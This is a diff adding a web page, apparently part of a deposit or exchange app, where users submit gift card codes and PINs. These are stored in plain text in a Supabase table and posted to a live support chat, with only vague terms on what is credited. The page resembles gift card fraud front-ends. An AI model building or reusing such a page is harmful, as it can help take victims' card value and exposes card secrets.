@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Gift Card Deposit</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{background:black;color:#fff;font-family:system-ui,Arial,sans-serif;padding:0}
+    .container{width:100%;max-width:520px;margin:0 auto;padding:14px 14px 30px;overflow-x:hidden; border: 1px solid #222}
+    .b_ack{color:#94a3b8;text-decoration:none;font-size:15px;display:inline-block;padding:8px 0}
+    h2{text-align:center;font-size:21px;margin:10px 0 6px}
+    .sub{text-align:center;color:#94a3b8;font-size:13px;line-height:1.5;margin-bottom:18px;padding:0 10px}
+    .card{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:16px;width:100%}
+    label{display:block;font-size:14px;color:#e2e8f0;margin:18px 0 7px;font-weight:600}
+    label small{color:#94a3b8;font-weight:400}
+    input,select,textarea{
+      width:100% !important;display:block;background:#0f172a;border:1px solid #334155;color:#fff;
+      padding:14px 12px;border-radius:10px;outline:none;font-size:15px;min-height:52px;
+    }
+    select{appearance:none}
+    textarea{min-height:70px;resize:vertical}
+    input::placeholder,textarea::placeholder{color:#64748b}
+    input:focus,select:focus,textarea:focus{border-color:#22c55e}
+    .rate-box{background:#052e16;border:1px solid #14532d;border-radius:10px;padding:13px;font-size:14px;color:#bbf7d0;line-height:1.6;word-wrap:break-word}
+    .rate-box b{color:#fff}
+    .hint{font-size:12.5px;color:#94a3b8;margin-top:7px;line-height:1.5}
+    input[type="file"]{padding:10px;background:#0f172a;font-size:13px}
+    input[type="file"]::-webkit-file-upload-button{background:#334155;color:#fff;border:none;padding:9px 14px;border-radius:8px;margin-right:10px}
+    .preview{white-space:pre-wrap;word-break:break-word;background:#020617;border:1px dashed #334155;border-radius:10px;padding:12px;font-size:13px;line-height:1.6;color:#e2e8f0;margin-top:14px;display:none}
+    .support-btn{display:block;width:100%;background:#22c55e;color:#000;font-weight:800;border:none;padding:16px 10px;border-radius:12px;font-size:16px;line-height:1.3;margin-top:20px;cursor:pointer}
+    .support-btn:disabled{background:#334155;color:#94a3b8}
+    .note{text-align:center;font-size:12px;color:#94a3b8;margin-top:12px;line-height:1.6}
+    .success{background:#052e16;border:1px solid #22c55e;color:#bbf7d0;padding:14px;border-radius:10px;font-size:14px;line-height:1.6;margin-top:14px;display:none}
+    .attach-reminder{background:#fef9c3;border:1px solid #eab308;color:#854d0e;padding:12px;border-radius:10px;font-size:13px;line-height:1.5;margin-top:12px;display:none}
+  </style>
+
+  <!-- Smartsupp Live Chat script - Your key is already inside -->
+  <script type="text/javascript">
+    var _smartsupp = _smartsupp || {};
+    _smartsupp.key = '0cf6e2f2863569a9a32db14a2d7ecc78646db70c';
+    window.smartsupp||(function(d) {
+      var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+      s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+      c.type='text/javascript';c.charset='utf-8';c.async=true;
+      c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+    })(document);
+  </script>
+</head>
+<body>
+ <div class="container">
+   <a class="b_ack" href="deposit_option.html">← Back</a>
+   <h2>GIFT CARD DEPOSIT</h2>
+   <p class="sub">Sell your gift card quickly. Fill in the form and send it to support.</p>
+
+   <div class="card">
+     <label for="cardType">Gift Card Type *</label>
+     <select id="cardType">
+       <option value="">-- Select Gift Card --</option>
+       <option>Amazon Gift Card</option>
+       <option>Apple / iTunes Gift Card</option>
+       <option>Steam Gift Card</option>
+       <option>Google Play Gift Card</option>
+       <option>Visa Gift Card</option>
+       <option>Vanilla Visa Gift Card</option>
+       <option>American Express (Amex) Gift Card</option>
+       <option>Walmart Gift Card</option>
+       <option>Target Gift Card</option>
+       <option>eBay Gift Card</option>
+       <option>Sephora Gift Card</option>
+       <option>Nike Gift Card</option>
+       <option>Other Gift Card</option>
+     </select>
+
+     <label for="cardForm">Card Form *</label>
+     <select id="cardForm">
+       <option>E-Code (Online Code)</option>
+       <option>Physical Card (Plastic)</option>
+       <option>Cash Receipt + Card</option>
+     </select>
+
+     <label for="cardAmount">Card Amount *</label>
+     <input type="number" id="cardAmount" placeholder="e.g. 100" />
+
+     <label for="currency">Currency</label>
+     <select id="currency">
+       <option>USD ($)</option>
+       <option>EUR (€)</option>
+       <option>GBP (£)</option>
+       <option>CAD ($)</option>
+       <option>AUD ($)</option>
+     </select>
+
+     <label>Please Note</label>
+     <div class="rate-box" id="rateBox">
+       Select card type and amount to continue.<br>
+       <b>Please note:</b> The amount credited to your account depends totally on how much your card is worth when traded.
+     </div>
+
+     <label for="cardCode">Card Code / E-Code *</label>
+     <input type="text" id="cardCode" placeholder="Enter card code" autocomplete="off" />
+
+     <label for="cardPin">Card PIN <small>(if any)</small></label>
+     <input type="text" id="cardPin" placeholder="Enter PIN" autocomplete="off" />
+     <p class="hint">Leave this blank if your card has no PIN.</p>
+
+     <label for="cardCountry">Card Country</label>
+     <select id="cardCountry">
+       <option>USA</option>
+       <option>UK</option>
+       <option>Canada</option>
+       <option>Europe</option>
+       <option>Australia</option>
+       <option>Other</option>
+     </select>
+
+     <label for="userName">Your Name *</label>
+     <input type="text" id="userName" placeholder="Your full name" />
+
+     <label for="cardImage">Upload Card Photo / Screenshot <small>(Optional)</small></label>
+     <input type="file" id="cardImage" accept="image/*" />
+     <p class="hint">Your photo will NOT be saved here. After the support chat opens, please attach the same photo inside the chat. For a physical card: Take a clear photo of the front and back. For an E-Code: Upload a screenshot of the code.</p>
+
+     <label for="extraNote">Extra Note <small>(Optional)</small></label>
+     <textarea id="extraNote" placeholder="e.g. I bought it today, receipt is available"></textarea>
+
+     <div class="success" id="successBox">Your gift card details have been sent to support. The support chat will open now. Please attach your card photo inside the chat if you selected one.</div>
+     <div class="attach-reminder" id="attachReminder">You selected a photo. Please attach it inside the Smartsupp chat window that just opened.</div>
+     <div class="preview" id="preview"></div>
+
+     <button class="support-btn" id="supportBtn" onclick="sendToSupport()">💬 I Am Sending This Card — Chat Support</button>
+     <p class="note">Your card details will be sent to support inside this app.<br>Do NOT share your card code with anyone except official support.</p>
+   </div>
+ </div>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script>
+  const supabaseClient = supabase.createClient("https://bximlwzpjiypajqcanse.supabase.co", "sb_publishable_xZOu-PA9_U5izK5wyPnJaA_8cG_pjnV");
+  const cardType = document.getElementById('cardType');
+  const cardAmount = document.getElementById('cardAmount');
+  const rateBox = document.getElementById('rateBox');
+
+  function updateRate(){
+    let type = cardType.value || "Gift Card";
+    let amt = cardAmount.value || 0;
+    if(!cardType.value || !amt){
+      rateBox.innerHTML = `Select card type and amount to continue.<br><b>Please note:</b> The amount credited to your account depends totally on how much your card is worth when traded.`;
+      return;
+    }
+    rateBox.innerHTML = `You are sending <b>${type} - $${amt}</b><br><b>Please note:</b> The amount credited to your account depends totally on how much your card is worth when traded.`;
+  }
+  cardType.addEventListener('change', updateRate);
+  cardAmount.addEventListener('input', updateRate);
+
+  async function sendToSupport(){
+    let type = document.getElementById('cardType').value;
+    let form = document.getElementById('cardForm').value;
+    let amount = document.getElementById('cardAmount').value;
+    let currency = document.getElementById('currency').value;
+    let code = document.getElementById('cardCode').value.trim();
+    let pin = document.getElementById('cardPin').value.trim();
+    let country = document.getElementById('cardCountry').value;
+    let name = document.getElementById('userName').value.trim();
+    let note = document.getElementById('extraNote').value.trim();
+    let fileInput = document.getElementById('cardImage');
+    let hasImage = fileInput.files && fileInput.files.length > 0;
+
+    if(!type){ alert("Please select a Gift Card Type"); return; }
+    if(!amount){ alert("Please enter the Card Amount"); return; }
+    if(!code){ alert("Please enter the Card Code"); return; }
+    if(!name){ alert("Please enter Your Name"); return; }
+
+    let btn = document.getElementById('supportBtn');
+    btn.textContent = "Sending to support... Please wait";
+    btn.disabled = true;
+
+    let msg = `Hello Support, I am sending a ${type} gift card.\n\n` +
+      `Card Type: ${type}\n` +
+      `Card Form: ${form}\n` +
+      `Amount: ${currency} ${amount}\n` +
+      `Country: ${country}\n` +
+      `Card Code: ${code}\n` +
+      `Card PIN: ${pin ? pin : "No PIN"}\n` +
+      `Name: ${name}\n` +
+      (note ? `Note: ${note}\n` : ``) +
+      (hasImage ? `Note: I have a card photo. I will attach it in this chat now.\n` : ``) +
+      `\nPlease confirm the rate and payment. Thank you.`;
+
+    // STEP 1: OPEN SMARTSUPP FIRST
+    let smartsuppOpened = false;
+    try {
+      if(typeof smartsupp !== 'undefined'){
+        smartsupp('name', name);
+        smartsupp('chat:open');
+        smartsuppOpened = true;
+        setTimeout(() => {
+          try { smartsupp('chat:message', msg); } catch(e){ console.log("Smartsupp message error", e); }
+        }, 1000);
+      }
+    } catch(e){
+      console.log("Smartsupp error", e);
+    }
+
+    // STEP 2: SAVE TEXT ONLY TO SUPABASE - No image, no storage used
+    try {
+      let { error: dbError } = await supabaseClient.from('gift_card_deposits').insert([{
+        user_name: name,
+        card_type: type,
+        card_form: form,
+        amount: amount,
+        currency: currency,
+        card_country: country,
+        card_code: code,
+        card_pin: pin || null,
+        extra_note: note || null,
+        status: 'pending'
+      }]);
+      if(dbError){ console.log("Supabase save error:", dbError.message); }
+    } catch(e){
+      console.log("Supabase error", e);
+    }
+
+    document.getElementById('successBox').style.display = "block";
+    if(hasImage){
+      document.getElementById('attachReminder').style.display = "block";
+    }
+    document.getElementById('preview').style.display = "block";
+    document.getElementById('preview').textContent = msg;
+
+    btn.textContent = "💬 I Am Sending This Card — Chat Support";
+    btn.disabled = false;
+
+    if(!smartsuppOpened){
+      alert("Your details have been saved, but Smartsupp did not open. Please check your internet connection and try again.");
+    } else if(hasImage){
+      alert("Your details have been sent. Please attach your card photo inside the Smartsupp chat window that just opened.");
+    } else {
+      alert("Your details have been sent to support. Please wait for a reply in the chat.");
+    }
+  }
+</script>
+</body>
+</html>
